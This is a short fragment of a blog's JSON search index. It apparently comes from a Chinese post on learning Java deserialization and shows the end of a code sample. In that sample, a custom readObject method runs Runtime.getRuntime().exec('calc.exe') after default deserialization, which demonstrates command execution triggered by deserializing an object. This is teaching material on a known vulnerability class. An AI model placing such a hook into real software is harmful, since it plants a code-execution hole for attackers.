readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException{ //执行默认的readObject()方法 in.defaultReadObject(); //执行命令 Runtime.getRuntime().exec(&quot;calc.exe&quot;); } }","link":"/2022/05/02/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/"}],"tags":[],"categories":[]}